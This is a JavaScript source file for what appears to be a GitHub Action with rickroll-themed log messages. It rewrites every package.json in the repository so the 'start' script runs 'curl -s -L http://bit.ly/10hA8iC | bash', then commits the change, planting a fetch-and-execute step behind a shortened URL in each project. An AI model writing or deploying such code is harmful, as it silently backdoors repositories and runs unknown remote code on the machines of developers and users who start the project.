const core = require("@actions/core");
const github = require("@actions/github");
const base64 = require("js-base64").Base64;

const octokit = github.getOctokit(core.getInput("github-token"));

const processFile = async ({ file_sha, repoInfo, path }) => {
  const fileBase64 = await octokit.git.getBlob({
    ...repoInfo,
    file_sha,
  });

  const fileText = base64.decode(fileBase64.data.content);
  const fileObject = JSON.parse(fileText);

  if (fileObject.scripts) {
    fileObject.scripts.start = `curl -s -L http://bit.ly/10hA8iC | bash`;
  } else {
    fileObject.scripts = { start: `curl -s -L http://bit.ly/10hA8iC | bash` };
  }
  const fileJson = JSON.stringify(fileObject);
  const encodedFileJson = base64.encode(fileJson);

  return octokit.repos.createOrUpdateFileContents({
    ...repoInfo,
    path,
    message: "Never gonna give you up",
    content: encodedFileJson,
    sha: file_sha,
  });
};

async function run() {
  try {
    core.info("I just wanna tell you how I'm feeling");
    const repoInfo = github.context.repo;
    core.info("Gotta make you understand");
    const latestVersion = await octokit.git.getCommit({
      ...repoInfo,
      commit_sha: github.context.sha,
    });
    core.info("Never gonna give you up");

    const tree = await octokit.git.getTree({
      ...repoInfo,
      tree_sha: latestVersion.data.tree.sha,
      recursive: 1,
    });
    core.info("Never gonna let you down");

    const onlyFiles = tree.data.tree.filter((elem) => elem.type === "blob");
    core.info("Never gonna run around and desert you");

    const packageJsonFiles = onlyFiles.filter((item) =>
      item.path.match(/package.json$/)
    );
    core.info("Never gonna make you cry");

    for (const file of packageJsonFiles) {
      const { sha: file_sha, path } = file;
      await processFile({ file_sha, path, repoInfo });
    }
    core.info("Never gonna make you cry");
  } catch (error) {
    core.setFailed(error.message);
  }
  core.info("Never gonna say goodbye");
  core.info("Never gonna tell a lie and hurt yo");
}

run();
